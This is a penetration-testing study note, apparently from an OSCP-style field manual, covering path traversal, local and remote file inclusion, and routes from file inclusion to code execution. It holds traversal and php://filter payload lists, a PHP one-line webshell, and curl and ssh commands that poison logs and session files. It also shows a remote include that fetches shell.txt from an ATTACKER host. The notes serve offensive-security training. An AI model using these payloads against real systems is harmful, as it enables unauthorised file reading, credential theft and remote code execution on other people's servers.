---
status: working
tags:
  - web
  - lfi
  - rfi
  - path-traversal
---
> *Local/Remote File Inclusion and Path Traversal:* Turning a file-path parameter into file read, and then into code execution. Reach for this when a parameter like `?page=`, `?file=`, `?include=`, `?template=`, or `?lang=` changes the response based on the path you supply. The payload lists are grouped on purpose, you try them as a set against one parameter.

# Read Files (Traversal)

Start with plain `../` traversal to a known file to prove the bug exists, then escalate to encoded variants only if a filter strips your `../`.

```
?page=../../../../etc/passwd
?page=../../../../etc/passwd%00            (null byte, legacy PHP < 5.3.4)
?page=..%2f..%2f..%2fetc%2fpasswd          (URL-encoded slashes)
?page=%252e%252e%252f                      (double-encoded ../ )
?page=/etc/passwd                          (absolute path)
?page=....\\....\\windows\win.ini          (Windows)
```

> [!TIP] Files to Demonstrate Traversal-based Read On
> `/etc/passwd` is the Linux proof-file, `win.ini` is the Windows equivalent. Each encoded variant defeats a different filter (URL-encoding beats a naive `../` string match, double-encoding beats a filter that decodes once then checks, etc.).

# LFI Techniques
## PHP Wrappers

One you've found local file inclusion, like the following, you can utilize a particular **PHP stream wrapper**:
```php
include($_GET['page']);
```

The above takes a parameter straight from the URL and feeds it to `include()` or `require()` with zero sanitization. Normally, it'd be used for typical page routing (e.g., `?page=about.php`) and so on, but because you control the string, you control what PHP tries to include.

And, during a plain `include` like above, PHP actually parses the PHP file specified, runs everything inside of the `<?php ?>` tags, and only non-code text or whatever the code deliberately echoes ends up in the output.

So targeting something like `config.php` is typically the worse case scenario, as it is usually nothing but assignments (e.g., variables like `$db_user` and `$db_pass` are set in here).

> [!INFO] What `php://filter` Does
> This is the *particular* PHP stream wrapper mentioned at the start of this section. Stream wrappers let PHP treat various things as if they were files, and this particular one lets you insert a filter that transforms the stream before it reaches the `include`.
> 
> The specific transformation is `convert.base64-encode`, which reads the raw bytes of the target file and base64-encodes them. So instead of PHP executing `config.php` and outputting just the non-code text, it'll output the whole base64 blob, which contains the entire `<?php ?>` tag contents, onto the page.

Using the `php://filter` stream wrapper to encode all contents, including the PHP code block we want, and render on the screen:
```
?page=php://filter/convert.base64-encode/resource=config.php
```

From here, you'd just decode it locally.

You can even combine this with directory traversal to grab something like `/etc/passwd`:
```
?page=php://filter/convert.base64-encode/resource=../../../../etc/passwd
```

> [!NOTE]
> For something like `/etc/passwd`, you wouldn't really need to base64-encode it, since none of it is code, but it's a good habit that ensures clean output.

In a different file inclusion case, let's say you have:
```php
include($_GET['page'] . '.php');
```

Which will glue `.php` onto the end of whatever you pass. Then you can just pass the name of the file without the extension:
```
?page=php://filter/convert.base64-encode/resource=index
```

## LFI to RCE via Log Poisoning

`include()` parses ***whatever*** file you point it as PHP. It doesn't care about whether a file is a log, a session store, or a mailbox. It reads the bytes and executes anything between `<?php` and `?>`, and treats everything else as literal output.

So, if you get attacker-controlled PHP written into any file on disk that the web server user can later read, then including that file executes your code.

**Route 1a:** Web server access log via `User-Agent`
This is the most common one. The server logs every request, and several fields of that request are entirely yours to control. `User-Agent` is primarily the target because the server writes this header verbatim into `access.log`.

The following `User-Agent` value can be sent to achieve this:
```http
User-Agent: <?php system($_GET['c']); ?>
```

> [!TIP] Good Poisoning Habit
> Send this request by either Burp Suite, or cURL:
> ```bash
> curl -s -A '<?php system($_GET["c"]); ?>' 'http://$IP/'
> ```
> 
> Browsers won't let you set your own `User-Agent` header value, as they set their own.

Now that the log has been poisoned, you can call particular system commands (e.g., `id`) via something like:
```bash
curl -s 'http://$IP/?page=/var/log/apache2/access.log&c=id'
```

> [!INFO] Reliability of Log Poisoning
> Two conditions must exist for log poisoning to work:
> 1) The log has to be readable by the web user (e.g., `www-data`)
> 2) The log path has to match the distro and the server
>    - Apache on Debian/Ubuntu: `/var/log/apache2/access.log`
>    - Apache on RHEL/CentOS: `/var/log/httpd/access_log`
>    - nginx: `/var/log/nginx/access.log` and `/var/log/nginx/error.log`

**Route 1b:** Poisoning `auth.log` via the SSH Username
Same exact principle as *Route 1a*, but targeting a different writable file.

When you attempt an SSH login, the OpenSSH server daemon (sshd) logs the username you tried, including for failed attempts. So the username can serve as an injection point:
```bash
ssh '<?php system($_GET["c"]); ?>'@$IP
```

Then `include()` `/var/log/auth.log`.

> [!WARNING] A Caveat to SSH-based Poisoning
> `auth.log` is normally owned by root and the `adm` group, not world-readable, so `www-data` usually cannot read it. This makes it less reliable, but can pay off on a misconfigured box.

**Route 2:** `/proc/<pid>/environ`
> [!NOTE]
> This is a handy method when logs aren't readable, but it has aged poorly. This particular vulnerability is almost entirely dead on modern PHP setups.

This pseudo-file in the `/proc` virtual filesystem stores the initial environment variables set when the process (identified by `<pid>`) was started. So when the PHP process reads `/proc/self/environ` during your include, it sees its own environment, and in older CGI and FastCGI setups the incoming request's `User-Agent` is present there as `HTTP_USER_AGENT`.

So if you poison the `User-Agent` just like in *Route 1a*, but include `/proc/self/environ` instead of a log, your payload executes straight out of the process environment.

**Route 3:** PHP session files
> [!NOTE]
> You need the app to actually persist attacker-controlled data in the session, which is not always an offer. If it does work, it is nice because the affected file is a small one you effectively own, with none of the problems that come from large web server logs.

PHP stores session state server-side as files, named `sess_<PHPSESSID>` and living in a path like `/var/lib/php/sessions/`, sometimes `/tmp`, sometimes a versioned path. The file contains the serialized contents of `$_SESSION`.

**The opening to look for is any app feature that stores your input into the session.** This could be things like:
- A remembered username
- A language preference
- A search term
- Anything the app writes into `$_SESSION` that reflects something you sent.

If you can get your PHP payload into one of those session values, it gets serialized into your session file on disk. You already know the filename because it is your own `PHPSESSID` cookie.

Include `/var/lib/php/sessions/sess_<your_ID>` and your payload runs.


**Route 4:** `/var/mail/<user>`
If the box runs an SMTP service you can reach and a local user you can deliver to, a message you send gets written to that user's mail spool:
- `/var/mail/<user>` or
- `/var/spool/mail/<user>`

Put PHP in the message body, send it to a local user, then include the mailbox.

> [!NOTE] OSCP Note
> Access-log poisoning via the `User-Agent` is the most common and reliable route on OSCP-style boxes. Detailed PoC steps live on HackTricks and PayloadsAllTheThings (see [[00B - References]]). Once you have code execution, pull a proper shell with [[05E - Reverse Shells]].

# RFI

This has an identical sink to LFI (`include()` or `require()`), but the path you control points at a remote URL instead of a local file. When PHP evaluates `include('http://attacker/shell.txt')`, it fetches that URL over the network, pulls down the bytes, and then parses and executes the result as PHP exactly the way it would a local include.

There are **two** settings, or two `php.ini` directives to focus on:
- `allow_url_fopen` controls whether PHP's file functions (`fopen`, `file_get_contents`, and so on) may open URLs at all. Default is On.
- `allow_url_include` controls whether the `include()` and `require()` family may use URLs. Default is Off, and has been since PHP 5.2.0 back in 2006.

You host the file as `.txt`, rather than `.php`. This is because the actual PHP would be executed when the target tries to fetch it from your machine, but on YOUR machine. The goal is to get all the raw `<?php ?>` source code to travel to the target, so that they execute it.

**Walking through a full example:**

First, create your `shell.txt` file:
```Plaintext
<?php system($_GET['c']); ?>
```

Then host it via the usual Python webserver:
```bash
python3 -m http.server 80
```

Then trigger the fetch from the target's vulnerable web application:
```URL
# trigger
?page=http://ATTACKER/shell.txt&c=id
```

> [!note]
> Far rarer than LFI on modern targets since remote includes are off by default, but trivial when enabled (the target pulls and runs a file you host). Serve it with the HTTP one-liner from [[11AA - High-Frequency One-Liners]].

## See also

- [[02B - Web Enumeration]] for finding the vulnerable parameter
- [[05E - Reverse Shells]] for the payload you trigger once you have RCE
- [[05D - Finding Credentials]] for what to grep out of source you read
- Source: *OSCP Field Manual* section 3.1
